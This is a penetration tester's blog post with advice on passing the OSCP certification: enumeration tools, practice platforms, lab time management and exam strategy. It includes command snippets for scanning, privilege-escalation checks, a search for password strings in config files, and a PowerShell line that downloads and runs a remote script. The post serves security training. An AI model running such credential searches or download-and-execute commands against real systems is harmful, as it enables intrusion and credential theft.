---
slug: oscp-journey/
title: How to Pass the OSCP
date: 2019-12-04
category: opinions
subtitle: The meaning of Try Harder
tags: challenge, ethical-hacking, pentesting, security, training, exploit
image: https://res.cloudinary.com/fluid-attacks/image/upload/v1620330964/blog/oscp-journey/cover_dcbd71.webp
alt: 'Man sitting facing laptop. Photo by Clint Patterson on Unsplash:
  https://unsplash.com/photos/dYEuFB8KQJk'
description: The OSCP exam is one of the hardest certifications out there
  for pentesters. Here we show you how you can prepare yourself
  to do your best on it.
keywords: OSCP, Business, Information, Security, Protection, Hacking,
  Best Practices, Ethical Hacking, Pentesting
author: Jonathan Armas
writer: johna
name: Jonathan Armas
about1: Systems Engineer, OSCP - Security+
about2: '"Be formless, shapeless like water" Bruce Lee'
source: https://unsplash.com/photos/dYEuFB8KQJk
---

Before taking the exam I already had years of work work experience as a
penetration tester at `Fluid Attacks`. So, I already had the knew how to
perform a penetration test and how to build a technical report of my
findings. However, if you don’t have any work experience on the field or
you’re just starting out, this post may help you pass your exam.

The most important phase on a penetration test is scanning. Here you
will use tools to get information about your target, such as its
operating system, open ports, the services running on those ports and
their versions, whether they have public vulnerabilities or not, and
whether there is a public exploit for those vulnerabilities. Since
`metasploit` is restricted to only **ONE** machine (this includes the
auxiliary modules too) you need to be familiar with tools such as:

- [Nmap](https://nmap.org/)

- [Dirbuster](https://tools.kali.org/web-applications/dirbuster)

- [Nikto](https://tools.kali.org/information-gathering/nikto)

- [Gobuster](https://tools.kali.org/web-applications/gobuster)

- [Dirsearch](https://github.com/maurosoria/dirsearch)

- [enum4linux](https://tools.kali.org/information-gathering/enum4linux)

- [searchsploit](https://github.com/offensive-security/exploitdb/blob/master/searchsploit)

The only way to do this is by using them continuously until you develop
a solid enumeration strategy. To help with this there are services like
[hackthebox](https://www.hackthebox.eu/) and
[vulnhub](https://www.vulnhub.com/), where you can find vulnerable
machines on which to test your skills.

<div class="imgblock">

![owned-machines](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330964/blog/oscp-journey/hackthebox_efxh5c.webp)

</div>

Once there you can also practice the *gaining access* phase and your
privilege escalation strategies with multiple operating systems and
vulnerabilities that resemble the ones in real-life scenarios. You would
be surprised by how many times I’ve encountered a vulnerability on
`hackthebox` first and then on a real-life service. The tools and
resources that I got the most from for privilege escalation were:

- [linenum](https://github.com/rebootuser/LinEnum)

- [windows exploit
  suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

- [searchsploit](https://github.com/offensive-security/exploitdb/blob/master/searchsploit)

- [JAWS](https://github.com/411Hall/JAWS)

- [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)

- [g0tmilk Linux privesc
  blog](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

- [absolomb Windows privesc
  blog](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)

I recommend hacking all the live machines that you can without any help
and get some points on the platform. Doing this helps you get used to
the tools and increases your confidence in using them when you take the
exam. If you can’t hack a machine and it gets removed, you can check the
walkthrough by
[Ippsec](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA) and
learn new things. You can learn stuff from these videos even for
machines you did root. Do this for at least one month or, if you have no
work experience whatsoever, two months.

## Attacking the Lab

I had a month of lab access, so the approach I took to the course and
the lab was to split them by days One concentrating on the guide and
taking notes of things that I didn’t know, and another day for attacking
the lab machines.

When you are working on the machines, also work on your time management
skills. Do not spend too much time on one machine when you can try
another one. Time management becomes very important when you are taking
your exam.

Before your lab access ends, be sure that you fully understand how to do
a `buffer overflow`. Take notes of every step, copy all the commands
that you need, and also how to get the `return address`.

## Post Lab

Here you want to gather the most information about the last two steps.
We are going back to `hackthebox` but instead of doing the active
machines we are going to do the ones from [this
list](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=0)
(there are also some from `vulnhub`).

<div class="imgblock">

![oscp-like-machines](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330963/blog/oscp-journey/url-oscp_lgqddx.webp)

</div>

Try to conquer those machines listed without the aid of walkthroughs.
When you finish one, look at these walkthroughs to check whether there
is another way in, if so then also practice it.

The day before the exam, I did nothing. Your body and mind need to rest
and you should not try to cram before the test. Eat your favourite foods
whatever they may be. Treat yourself to a well-deserved dessert, watch
movies, and series that you perhaps ignored when you focused on your
studies. The point is to de-stress so you’re fresh when you take the
exam.

## The Exam

The task is to gain administrative access to the machines in the
network. There are 5 machines, each is worth a certain number of points
if you complete it and you need at least `70` points to pass the exam.
The machine points are distributed as:

- 25 points Buffer Overflow

- 25 points machine

- Two 20 points machines

- 10 points machine

I started with the `25 points BoF` machine while I scanned all the other
ones. I did this because I knew that I could follow the guide
step-by-step and get the BoF points. My scanning strategy was to run
`nmap` with these options:

**nmap with options.**

``` bash
nmap ip.ip.ip.ip -A -p- --min-rate=5000 --max-retries=5 -o tcp.txt
```

Also, I pinged the machine in order to view its operative system. If the
`TTL` (Time to Live) is `64` then it is a `Linux` machine and if it is
`128` then it’s a `Windows` machine. When the port scan finished I
checked every web service and used a web crawler like `dirbuster` or
`dirsearch`.

After finishing the `BoF` machine, I started hacking the machines with
all the information that I had collected. I ended up going down rabbit
holes trying to gain admin privileges on the 25-pointer machine. Because
of the time the 25-point machine was taking, I quickly decided to switch
to both the 20-point and finally, the 10-pointer machine.

For privilege escalation I first checked the operative system version
and kernel, this can be done by running:

``` bash
uname -a #linux
> systeminfo #windows
```

If it was `Linux` I checked for `sudo` rights running processes, and for
`SUID` executables. There is a tool named `linenum` but it’s too verbose
and I like to search for things manually.

``` bash
sudo -l
ps -aux
find / -perm -u=s -type f 2>/dev/null
```

If it was `Windows`, I checked for the `Groups.xml` file (usually it has
administrative user and password information there), installed software
and tried to use `powershell` to run `Windows` exploits. When it comes
to `Windows`, most of the time the way of escalating privileges is
through a vulnerability in the `OS` version or in an installed program
version.

``` bash
> findstr /si password *.xml *.ini *.txt *.config 2>nul
> IEX(New-Object Net.WebClient).downloadString('http://server/script.ps1')
```

I finished my test in less than 10 hours with 4 admins and 1 user for a
little more than `75` total points. The mistake that I made was to be
lazy with my screenshots, so I needed to redo all the machines to get
all of my evidences. **DO NOT DO THIS\!** The next day I did my
technical documentation, the advice here is to put everything that you
did from the *scanning* phase up to the *privilege escalation* phase.
Also, if you modified an exploit (even if is only one line) put it on
the report and mark what you modified.

<div class="imgblock">

![oscp-win](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330964/blog/oscp-journey/oscp-win_llivv3.webp)

</div>

## Be prepared and do your best

The OSCP is a difficult certification, but it’s not impossible. The
steps before the lab are going to help you get the most out of the
course and to establish your own routine when it comes to doing a
penetration test. The enumeration and scanning phases are the most
important ones in the whole process because you can spend hours going
down rabbit holes if you do not do these steps properly. Mental
toughness is needed to pass this test, so be prepared to think quickly
and creatively, daisy-chaining vulnerabilities, and rest when you need
it. The discord groups of hackthebox and OFFSEC are at your disposal to
answer your questions or give you hints where you need them. Try harder.
